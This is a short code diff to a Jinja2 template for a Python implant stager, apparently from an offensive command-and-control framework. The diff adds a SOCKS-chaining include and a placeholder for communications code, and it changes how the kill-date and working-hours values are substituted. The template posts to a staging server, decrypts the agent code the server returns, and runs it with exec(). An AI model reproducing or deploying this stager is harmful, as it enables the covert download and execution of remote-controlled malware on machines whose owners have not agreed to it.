@@ -7,8 +7,6 @@ This file is a Jinja2 template.
         kill_date
         staging_key
         profile
-        stage_1
-        stage_2
 """
 
 import random
@@ -19,10 +17,14 @@ import urllib.request
 {% include 'common/aes.py' %}
 {% include 'common/diffiehellman.py' %}
 {% include 'common/get_sysinfo.py' %}
+{% include 'common/sockschain.py' %}
 
 def post_message(uri, data):
     global headers
     return (urllib.request.urlopen(urllib.request.Request(uri, data, headers))).read()
+
+# Replace with comms code
+REPLACE_COMMS
 
 # generate a randomized sessionID
 sessionID = b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))
@@ -96,7 +98,7 @@ response = post_message(postURI, routingPacket)
 
 # step 6 -> server sends HMAC(AES)
 agent = aes_decrypt_and_verify(key, response)
-agent = agent.replace('REPLACE_WORKINGHOURS', WorkingHours)
-agent = agent.replace('REPLACE_KILLDATE', KillDate)
+agent = agent.replace('{{ working_hours }}', WorkingHours)
+agent = agent.replace('{{ kill_date }}', KillDate)
 
 exec(agent)
